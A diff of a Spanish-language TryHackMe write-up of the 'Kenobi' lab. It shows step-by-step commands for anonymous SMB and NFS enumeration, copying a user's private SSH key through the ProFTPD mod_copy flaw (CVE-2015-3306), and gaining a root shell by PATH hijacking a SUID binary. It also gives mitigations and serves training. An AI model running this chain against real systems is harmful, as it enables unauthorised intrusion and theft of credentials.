@@ -1,36 +1,28 @@
 # Kenobi — TryHackMe (Fácil)
 
-**Plataforma:** TryHackMe
-**Dificultad:** Fácil
-**Categorías:** Reconocimiento de red, enumeración SMB, NFS,
-explotación de ProFTPD, escalada de privilegios por PATH hijacking
-**Herramientas:** Nmap, smbclient, netcat, ssh, mount
+**Plataforma:** TryHackMe · **Categoría:** Enumeración SMB/NFS / Explotación ProFTPD (CVE-2015-3306) / PrivEsc PATH Hijacking · **Herramientas:** Nmap, smbclient, netcat, searchsploit, mount, ssh
 
-## Índice
-
-1. [Resumen](#resumen)
-2. [Reconocimiento](#1-reconocimiento)
-3. [Enumeración SMB](#2-enumeración-smb)
-4. [Enumeración NFS](#3-enumeración-nfs)
-5. [Explotación de ProFTPD](#4-explotación-de-proftpd)
-6. [Acceso inicial por SSH](#5-acceso-inicial-por-ssh)
-7. [Escalada de privilegios](#6-escalada-de-privilegios)
-8. [Lecciones aprendidas](#lecciones-aprendidas)
-9. [Mitigaciones](#mitigaciones-perspectiva-defensiva)
-10. [Referencias](#referencias)
+---
 
 ## Resumen
 
-Kenobi es una máquina Linux con múltiples servicios de red: SSH,
-HTTP, Samba (SMB), NFS y ProFTPD. La enumeración del share SMB
-anónimo revela información sobre la clave SSH del usuario y el
-servidor FTP. ProFTPD 1.3.5 tiene una vulnerabilidad en el módulo
-mod_copy (CVE-2015-3306) que permite copiar archivos arbitrarios
-sin autenticación usando los comandos `SITE CPFR` y `SITE CPTO`.
-Se copia la clave SSH privada del usuario a una carpeta exportada
-por NFS, se monta esa carpeta y se accede por SSH. La escalada de
-privilegios se logra mediante PATH hijacking sobre un binario SUID
-personalizado.
+Máquina Linux con múltiples servicios de red: SSH, HTTP, Samba (SMB), NFS y ProFTPD. La enumeración del share SMB anónimo revela la ubicación de la clave SSH privada del usuario `kenobi`. ProFTPD 1.3.5 tiene una vulnerabilidad en el módulo `mod_copy` (CVE-2015-3306) que permite copiar archivos arbitrarios del sistema sin autenticación usando los comandos `SITE CPFR` y `SITE CPTO`. Se copia la clave privada a `/var/tmp/`, carpeta exportada por NFS, se monta localmente y se accede por SSH. La escalada de privilegios se logra mediante PATH hijacking sobre un binario SUID personalizado (`/usr/bin/menu`) que llama a `curl` sin ruta absoluta.
+
+---
+
+## Habilidades demostradas
+
+- Escaneo de puertos y servicios con Nmap, incluyendo scripts NSE para SMB y NFS
+- Enumeración de shares SMB y acceso anónimo con smbclient
+- Enumeración de exports NFS con scripts Nmap (`nfs-showmount`)
+- Identificación de versión de servicio mediante banner grabbing con netcat
+- Búsqueda de exploits conocidos con searchsploit (ExploitDB offline)
+- Explotación de CVE-2015-3306 (ProFTPD mod_copy) sin autenticación
+- Montaje de exports NFS para exfiltrar archivos del servidor
+- Escalada de privilegios mediante PATH hijacking en binario SUID personalizado
+- Encadenamiento de vulnerabilidades: reconocimiento → información sensible → explotación → acceso SSH → root
+
+---
 
 ## 1. Reconocimiento
 
@@ -38,28 +30,23 @@ personalizado.
 nmap -sC -sV <IP>
 ```
 
-| Puerto | Servicio | Versión |
-|--------|----------|---------|
-| 21 | FTP | ProFTPD 1.3.5 |
-| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
-| 80 | HTTP | Apache 2.4.41 (Ubuntu) |
-| 111 | rpcbind | 2-4 (RPC #100000) |
-| 139 | netbios-ssn | Samba 4.6.2 |
-| 445 | netbios-ssn | Samba 4.6.2 |
-| 2049 | nfs | 3-4 (RPC #100003) |
+| Puerto | Servicio   | Versión                      |
+|--------|------------|------------------------------|
+| 21     | FTP        | ProFTPD 1.3.5                |
+| 22     | SSH        | OpenSSH 8.2p1 Ubuntu         |
+| 80     | HTTP       | Apache 2.4.41 (Ubuntu)       |
+| 111    | rpcbind    | 2-4 (RPC #100000)            |
+| 139    | netbios-ssn| Samba 4.6.2                  |
+| 445    | netbios-ssn| Samba 4.6.2                  |
+| 2049   | nfs        | 3-4 (RPC #100003)            |
 
-Total: **7 puertos abiertos**.
+7 puertos abiertos. La presencia de rpcbind (111) y NFS (2049) indica que el servidor exporta carpetas de red — vector que vale la pena explorar en paralelo al SMB.
 
-El escaneo también reveló a través de rpcbind que NFS estaba
-activo, con información de los exports disponibles en la sección
-`rpcinfo` del resultado.
+---
 
 ## 2. Enumeración SMB
 
-SMB (Server Message Block) es el protocolo estándar para compartir
-archivos en redes Windows/Linux mixtas. Samba es la implementación
-de SMB para Linux. Los "shares" son carpetas compartidas accesibles
-por la red.
+SMB (Server Message Block) es el protocolo estándar para compartir archivos en redes Windows/Linux mixtas. Samba es la implementación para Linux. Los "shares" son carpetas compartidas accesibles por red.
 
 Listado de shares disponibles:
 
@@ -68,50 +55,62 @@ smbclient -L //<IP>
 # Presionar Enter cuando pida contraseña (acceso anónimo)
 ```
 
-Se encontraron 3 shares: `print$`, `anonymous` e `IPC$`.
-El share `anonymous` era accesible sin credenciales.
+![smbclient -L mostrando shares: print$, anonymous, IPC$](img/01-smb-shares.png)
 
-Conexión al share anónimo y descarga del archivo disponible:
+Se encontraron 3 shares: `print$`, `anonymous` e `IPC$`. El share `anonymous` era accesible sin credenciales — cualquier usuario de red puede conectarse.
+
+Conexión al share anónimo:
 
 ```bash
 smbclient //<IP>/anonymous -N
-# Dentro del cliente SMB:
+```
+
+![Conexión anónima al share: ls muestra log.txt](img/02-smb-log-txt.png)
+
+El share contiene `log.txt`. Los comandos `cat`, `tac` y `less` no existen dentro del cliente SMB — son comandos de shell local, no comandos del protocolo. La forma correcta de leer el archivo es descargarlo primero:
+
+```bash
 get log.txt
 exit
 ```
 
-El archivo `log.txt` contenía información sobre la generación de
-una clave SSH para el usuario `kenobi` y detalles del servidor
-ProFTPD, incluyendo que FTP corría en el **puerto 21**.
+El archivo `log.txt` contenía información crítica para el siguiente paso:
+- Confirmación de que se generó una clave SSH para el usuario `kenobi`: `/home/kenobi/.ssh/id_rsa`
+- Detalles del servidor ProFTPD corriendo en el puerto 21
 
-Enumeración de shares con scripts de Nmap:
+También se enumeraron los shares con scripts NSE de Nmap:
 
 ```bash
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
 ```
 
+---
+
 ## 3. Enumeración NFS
 
-NFS (Network File System) es el protocolo nativo de Linux para
-compartir carpetas en red. El puerto 111 (rpcbind) gestiona el
-registro de servicios RPC, incluyendo NFS.
+NFS (Network File System) es el protocolo nativo de Linux para compartir carpetas en red. El puerto 111 (rpcbind) gestiona el registro de servicios RPC, incluyendo NFS.
 
 ```bash
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
 ```
 
-Resultado: el servidor exporta **`/var`** vía NFS, accesible
-desde cualquier IP (`*`).
+![nfs-showmount: el servidor exporta /var con acceso desde cualquier IP (*)](img/03-nfs-showmount.png)
+
+El servidor exporta `/var` vía NFS, accesible desde cualquier IP (`*`). Esto significa que cualquier máquina en la red puede montar esa carpeta y leer su contenido — incluyendo cualquier archivo que alguien escriba en `/var/tmp/`.
+
+---
 
 ## 4. Explotación de ProFTPD
 
-### Identificación de la versión
+### Banner grabbing: versión del servicio
 
 ```bash
 nc <IP> 21
 ```
 
-El banner de ProFTPD reveló la versión: **1.3.5**.
+![nc al puerto 21 revelando: ProFTPD 1.3.5 Server](img/04-nc-ftp-banner.png)
+
+El banner reveló la versión exacta: **ProFTPD 1.3.5**. Con el nombre y versión del software es posible buscar vulnerabilidades conocidas.
 
 ### Búsqueda de exploits
 
@@ -119,18 +118,13 @@ El banner de ProFTPD reveló la versión: **1.3.5**.
 searchsploit proftpd 1.3.5
 ```
 
-Se encontraron 4 exploits, todos relacionados con el módulo
-**mod_copy**. Este módulo implementa los comandos `SITE CPFR`
-(Copy From) y `SITE CPTO` (Copy To), que permiten copiar archivos
-de cualquier parte del sistema de archivos **sin autenticación**.
+![searchsploit: 4 exploits todos relacionados con mod_copy](img/05-searchsploit.png)
+
+searchsploit (ExploitDB offline) devolvió 4 resultados, todos relacionados con el módulo **mod_copy**. Este módulo implementa los comandos `SITE CPFR` (Copy From) y `SITE CPTO` (Copy To), que permiten copiar archivos de cualquier parte del sistema de archivos **sin autenticación**. Es CVE-2015-3306.
 
 ### Explotación
 
-El archivo `log.txt` del share SMB confirmaba que el usuario
-`kenobi` tenía una clave SSH en `/home/kenobi/.ssh/id_rsa` y que
-el servicio FTP corría como el usuario `kenobi`. Usando mod_copy,
-se copió la clave privada a `/var/tmp/`, que es parte de la
-carpeta `/var` exportada por NFS:
+El archivo `log.txt` del share SMB confirmaba que el usuario `kenobi` tenía su clave SSH en `/home/kenobi/.ssh/id_rsa`. Usando `mod_copy`, se copió esa clave a `/var/tmp/`, que pertenece a la carpeta `/var` exportada por NFS:
 
 ```bash
 nc <IP> 21
@@ -138,14 +132,18 @@ SITE CPFR /home/kenobi/.ssh/id_rsa
 SITE CPTO /var/tmp/id_rsa
 ```
 
-Respuestas del servidor:
-- `350 File or directory exists, ready for destination name`
-- `250 Copy successful`
+![nc al FTP: CPFR devuelve 350, CPTO devuelve 250 Copy successful](img/06-mod-copy-exploit.png)
+
+- `350 File or directory exists, ready for destination name` — el servidor confirmó que la clave existe
+- `250 Copy successful` — la clave fue copiada a `/var/tmp/`
+
+El encadenamiento es: SMB anónimo revela la ruta de la clave → mod_copy permite copiarla sin autenticación → NFS permite recuperarla sin credenciales.
+
+---
 
 ## 5. Acceso inicial por SSH
 
-Con la clave copiada a `/var/tmp/`, se montó el export NFS para
-recuperarla:
+Con la clave copiada a `/var/tmp/`, se montó el export NFS para recuperarla:
 
 ```bash
 mkdir /mnt/kenobiNFS
@@ -153,22 +151,17 @@ mount <IP>:/var /mnt/kenobiNFS
 ls -la /mnt/kenobiNFS/tmp/
 ```
 
-El archivo `id_rsa` era visible. Se copió localmente y se
-ajustaron los permisos (SSH rechaza claves con permisos
-demasiado abiertos):
+El archivo `id_rsa` era visible junto a otros directorios del sistema. Se copió localmente y se ajustaron los permisos — SSH rechaza claves con permisos más abiertos que 600 por seguridad:
 
 ```bash
 cp /mnt/kenobiNFS/tmp/id_rsa .
 chmod 600 id_rsa
-```
-
-Conexión SSH usando la clave privada:
-
-```bash
 ssh -i id_rsa kenobi@<IP>
 ```
 
-Flag de usuario en `/home/kenobi/user.txt`.
+Acceso SSH exitoso como `kenobi`. Flag de usuario en `/home/kenobi/user.txt`.
+
+---
 
 ## 6. Escalada de privilegios
 
@@ -178,88 +171,65 @@ Flag de usuario en `/home/kenobi/user.txt`.
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-Entre todos los binarios estándar del sistema, `/usr/bin/menu`
-era el único inusual — ninguna instalación estándar de Ubuntu
-incluye un binario con ese nombre con SUID.
-
-Al ejecutarlo, mostró 3 opciones: status check, kernel version
-e ifconfig.
-
-### Análisis del binario
-
-La sala confirmó que el binario ejecutaba los comandos `curl`,
-`uname` e `ifconfig` **sin ruta completa** (sin `/usr/bin/curl`,
-solo `curl`). Esto lo hace vulnerable a PATH hijacking.
+Entre los binarios estándar del sistema, `/usr/bin/menu` era el único inusual — ninguna instalación estándar de Ubuntu incluye un binario con ese nombre con el bit SUID activado. Al ejecutarlo, mostró 3 opciones: status check, kernel version e ifconfig.
 
 ### PATH Hijacking
 
-Cuando Linux busca un comando sin ruta completa, recorre las
-carpetas del `$PATH` en orden. Si se agrega una carpeta propia
-**al inicio** del PATH y se crea un archivo con el mismo nombre
-que el comando buscado, Linux lo encontrará primero y lo
-ejecutará en su lugar — heredando los privilegios del binario
-SUID (root).
+El binario ejecutaba los comandos `curl`, `uname` e `ifconfig` **sin ruta absoluta** (solo el nombre del comando, sin `/usr/bin/curl`). Esto lo hace vulnerable a PATH hijacking.
+
+Cuando Linux busca un comando sin ruta completa, recorre las carpetas del `$PATH` en orden. Si se agrega una carpeta propia **al inicio** del PATH y se crea un archivo con el mismo nombre del comando buscado, Linux lo encuentra primero y lo ejecuta — heredando los privilegios del binario SUID (root en este caso).
 
 ```bash
 cd /tmp
-echo /bin/sh > curl      # Crea un "curl" falso que lanza una shell
-chmod 777 curl            # Le da permisos de ejecución
-export PATH=/tmp:$PATH   # Agrega /tmp al inicio del PATH
-/usr/bin/menu            # Ejecuta el binario SUID
+echo /bin/sh > curl       # "curl" falso que lanza una shell
+chmod 777 curl             # permisos de ejecución
+export PATH=/tmp:$PATH    # /tmp al inicio del PATH
+/usr/bin/menu              # ejecutar el binario SUID
+# → elegir opción 1 (status check, que llama a curl)
 ```
 
-Al elegir la opción 1 (status check, que internamente llama a
-`curl`), el binario encontró primero `/tmp/curl` en el PATH,
-ejecutó `/bin/sh` con privilegios de root, y se obtuvo una
-shell de root.
+![PATH hijacking: whoami root, cat /root/root.txt con flag](img/07-path-hijack-root.png)
 
-```bash
-whoami
-# root
-cat /root/root.txt
-```
+Al elegir la opción 1, el binario encontró primero `/tmp/curl` en el PATH, ejecutó `/bin/sh` con privilegios de root y se obtuvo shell de root. Desde ahí, acceso completo al sistema.
+
+---
+
+## Lo que probé y no funcionó
+
+- **`cat`, `tac`, `less` dentro de smbclient**: el cliente SMB no es una shell — esos comandos no existen en el contexto del protocolo. La forma correcta de leer archivos del share es `get <archivo>` para descargarlo y luego leerlo localmente.
+- **nmap SMB con smb-enum-shares.nse en primera pasada**: el script NSE no devolvió los shares — solo confirmó que el puerto 445 estaba abierto como `microsoft-ds`. El listado de shares lo dio `smbclient -L` directamente. Los scripts NSE de SMB a veces requieren credenciales o no funcionan con todas las versiones de Samba.
+
+---
+
+## Impacto
+
+Un atacante externo sin credenciales puede obtener shell de root encadenando cuatro vulnerabilidades: acceso anónimo SMB que expone información sensible sobre la infraestructura, ProFTPD con mod_copy habilitado que permite copiar archivos arbitrarios del sistema sin autenticación, NFS exportando `/var` sin restricción de IP que permite recuperar cualquier archivo copiado allí, y un binario SUID personalizado que ejecuta comandos sin rutas absolutas. Ningún paso requiere credenciales ni CVEs adicionales — solo conocer la versión del software y encadenar las vulnerabilidades disponibles.
+
+---
+
+## Perspectiva defensiva
+
+- **Deshabilitar el módulo mod_copy de ProFTPD** si no es necesario, o actualizar a una versión posterior a 1.3.5 donde está parcheado. Los módulos de FTP que no se usan deben desactivarse explícitamente.
+- **Restringir el acceso NFS por IP** en lugar de usar `*`: solo las IPs que necesitan el montaje deben poder acceder.
+- **No incluir shares SMB anónimos con información sensible**: el acceso anónimo SMB debería limitarse a lo estrictamente necesario, y nunca exponer rutas de claves SSH o configuraciones de servicios.
+- **Los binarios SUID siempre deben usar rutas absolutas** para llamar a otros programas. Un binario SUID que llama a `curl` en vez de `/usr/bin/curl` es PATH hijacking esperando ocurrir.
+- **Auditar regularmente los binarios con SUID**: `find / -perm -4000 -type f 2>/dev/null`. Cualquier binario personalizado con SUID es una señal de alerta inmediata.
+
+---
 
 ## Lecciones aprendidas
 
-- SMB permite compartir archivos en red. El acceso anónimo a
-  shares puede exponer información sensible como rutas de claves
-  SSH o configuraciones internas.
-- NFS exporta carpetas del sistema de archivos que cualquier
-  máquina puede montar. Una carpeta exportada accesible + una
-  vulnerabilidad que permite escribir en ella = vector de
-  exfiltración de archivos.
-- ProFTPD mod_copy permite copiar archivos arbitrarios del
-  sistema sin autenticación — una vulnerabilidad crítica que
-  combina información de reconocimiento (ubicación de la clave
-  SSH) con escritura en una carpeta accesible (NFS).
-- `chmod 600` es obligatorio en claves SSH privadas. SSH rechaza
-  claves con permisos más abiertos para evitar que otros usuarios
-  las lean.
-- PATH hijacking: los binarios SUID que ejecutan comandos sin
-  ruta completa son vulnerables a que un atacante ponga un
-  programa malicioso con el mismo nombre en una carpeta que
-  controla, agregándola al inicio del PATH.
-- searchsploit permite buscar exploits conocidos offline. Es
-  más rápido que buscar en internet cuando ya sabes el nombre
-  y versión del software.
+- `smbclient` no es una shell: los comandos de lectura de archivos (`cat`, `less`, `tac`) no existen en el contexto del protocolo SMB. Para leer un archivo del share hay que descargarlo con `get` y abrirlo localmente.
+- El banner grabbing con `nc` es suficiente para identificar la versión exacta de un servicio FTP. Con nombre + versión exacta, searchsploit devuelve exploits aplicables en segundos.
+- SMB anónimo + NFS sin restricción de IP + CVE en FTP es un encadenamiento clásico: cada vulnerabilidad por separado puede parecer de bajo impacto, pero combinadas dan acceso root completo.
+- PATH hijacking requiere dos condiciones: un binario SUID que llame a comandos sin ruta absoluta, y capacidad de escribir en alguna carpeta que se pueda agregar al PATH antes que `/usr/bin`. `/tmp` siempre es escribible en Linux.
+- searchsploit funciona offline — no requiere conexión a internet. En un entorno de CTF o pentest sin acceso web, es la primera herramienta para buscar exploits conocidos por nombre y versión.
 
-## Mitigaciones (perspectiva defensiva)
-
-- Deshabilitar el módulo mod_copy de ProFTPD si no es necesario,
-  o actualizar a una versión posterior a 1.3.5 donde está
-  parcheado.
-- No exportar directorios sensibles por NFS, especialmente
-  carpetas que puedan contener claves SSH o archivos del sistema.
-- Restringir el acceso NFS por IP en lugar de usar `*`.
-- No incluir shares SMB anónimos con información sensible.
-- Los binarios SUID siempre deben usar rutas absolutas para
-  llamar a otros programas, nunca nombres relativos que puedan
-  ser manipulados vía PATH.
-- Auditar regularmente los binarios con SUID — cualquier binario
-  personalizado con SUID es una señal de alerta.
+---
 
 ## Referencias
 
 - [TryHackMe — Kenobi](https://tryhackme.com/room/kenobi)
+- [CVE-2015-3306 — ProFTPD mod_copy](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
+- [ExploitDB — ProFTPD 1.3.5 mod_copy](https://www.exploit-db.com/exploits/36742)
 - [GTFOBins — PATH hijacking](https://gtfobins.github.io/)
-- [searchsploit — ExploitDB](https://gitlab.com/exploit-database/exploitdb)
